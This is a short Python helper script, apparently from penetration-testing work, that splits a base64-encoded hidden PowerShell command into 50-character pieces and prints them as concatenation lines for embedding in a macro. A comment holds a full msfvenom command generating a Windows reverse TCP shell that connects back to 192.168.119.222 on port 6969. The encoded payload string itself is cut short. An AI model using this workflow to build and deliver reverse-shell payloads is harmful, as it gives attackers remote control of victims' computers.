#!/usr/bin/env python3

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.222 LPORT=6969 EXITFUNC=thread -f hta-psh

str = "powershell.exe -nop -w hidden -e aQBmAC...."

n = 50

for x in range(0, len(str), n):
    split = str[x:x+n]
    print(f'Str = Str + "{split}"')
